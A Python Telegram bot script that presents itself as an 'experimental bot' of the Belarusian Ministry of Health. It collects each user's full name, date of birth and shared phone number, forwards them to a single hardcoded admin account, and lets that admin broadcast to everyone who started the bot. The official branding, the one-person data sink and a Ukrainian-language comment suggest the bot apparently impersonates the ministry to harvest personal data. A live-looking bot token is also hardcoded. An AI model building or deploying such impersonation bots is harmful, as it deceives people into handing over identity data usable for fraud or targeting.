import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove

API_TOKEN = "8383126261:AAHV-m1cRtEs8uU0-zMUGo4oRoXsv_o3b0A"
ADMIN_ID = 7666912965  # твій Telegram ID (число!)

bot = Bot(token=API_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()

# временные данные пользователей
user_data = {}
# список пользователей, которые завершили заявку
completed_users = set()
# список ВСЕХ пользователей, которые хотя бы раз нажали /start
all_users = set()


# --- Команда /start ---
@dp.message(Command("start"))
async def start(message: types.Message):
    uid = message.from_user.id
    all_users.add(uid)  # ✅ сохраняем всех пользователей

    await message.answer(
        "👋 Вас приветствует <b>экспериментальный бот Министерства здравоохранения Республики Беларусь</b>\n\n"
        "Этот бот создан для <b>быстрого реагирования на экстренные ситуации</b> 🚨\n\n"
        "Пожалуйста, заполните небольшую форму.\n\n"
        "✍️ Укажите ваше <b>ФИО</b>:",
        reply_markup=ReplyKeyboardRemove()
    )
    user_data[uid] = {}
    if uid in completed_users:
        completed_users.remove(uid)


# --- Универсальная рассылка ---
@dp.message(Command("broadcast"))
async def broadcast_command(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("✍️ Отправьте сообщение (текст, фото, видео и т.д.), которое хотите разослать всем пользователям.")
    # включаем режим рассылки
    user_data[message.from_user.id] = {"mode": "broadcast"}


# --- Основной обработчик сообщений ---
@dp.message()
async def form_handler(message: types.Message):
    uid = message.from_user.id

    # --- 📢 Если админ в режиме рассылки ---
    if uid == ADMIN_ID and uid in user_data and user_data[uid].get("mode") == "broadcast":
        success, fail = 0, 0
        for user_id in all_users:
            try:
                await bot.copy_message(chat_id=user_id, from_chat_id=uid, message_id=message.message_id)
                success += 1
            except:
                fail += 1

        await message.answer(f"✅ Рассылка завершена.\nОтправлено: {success}\nОшибки: {fail}")
        user_data.pop(uid, None)  # выключаем режим
        return

    # --- 📋 Новая заявка ---
    if message.text == "📋 Подать новую заявку":
        await message.answer("✍️ Укажите ваше <b>ФИО</b>:", reply_markup=ReplyKeyboardRemove())
        user_data[uid] = {}
        if uid in completed_users:
            completed_users.remove(uid)
        return

    if uid not in user_data:
        return

    # --- Если пользователь прислал контакт ---
    if message.contact and "phone" not in user_data[uid]:
        user_data[uid]["phone"] = message.contact.phone_number
        await message.answer("📝 Опишите вашу <b>проблему или вопрос</b>:", reply_markup=ReplyKeyboardRemove())
        return

    # --- Анкета по шагам ---
    if "fio" not in user_data[uid]:
        user_data[uid]["fio"] = message.text
        await message.answer("📅 Укажите вашу <b>дату рождения</b> (ДД.ММ.ГГГГ):")

    elif "dob" not in user_data[uid]:
        user_data[uid]["dob"] = message.text

        # кнопка "Поделиться контактом"
        contact_keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📱 Поделиться номером", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        await message.answer("📱 Нажмите кнопку ниже, чтобы поделиться своим <b>номером телефона</b>:", reply_markup=contact_keyboard)

    elif "phone" not in user_data[uid]:
        await message.answer("⚠️ Пожалуйста, используйте кнопку, чтобы поделиться номером телефона.")

    elif "question" not in user_data[uid]:
        user_data[uid]["question"] = message.text

        text = (
            "📩 <b>Новая заявка!</b>\n\n"
            f"👤 ФИО: {user_data[uid]['fio']}\n"
            f"📅 Дата рождения: {user_data[uid]['dob']}\n"
            f"📱 Телефон: {user_data[uid]['phone']}\n"
            f"📝 Вопрос/Проблема: {user_data[uid]['question']}"
        )

        # Отправляем админу
        await bot.send_message(ADMIN_ID, text)

        # Кнопка для новой заявки
        keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text="📋 Подать новую заявку")]],
            resize_keyboard=True,
            one_time_keyboard=True
        )

        await message.answer(
            "✅ Ваша заявка успешно принята!\n\n"
            "Наши специалисты уже получили вашу информацию и свяжутся с вами в ближайшее время ⏳\n\n"
            "Спасибо, что обратились в <b>Чат-Бот Минздрава Республики Беларусь</b> 💼",
            reply_markup=keyboard
        )

        user_data.pop(uid)
        completed_users.add(uid)


# --- Запуск бота ---
async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
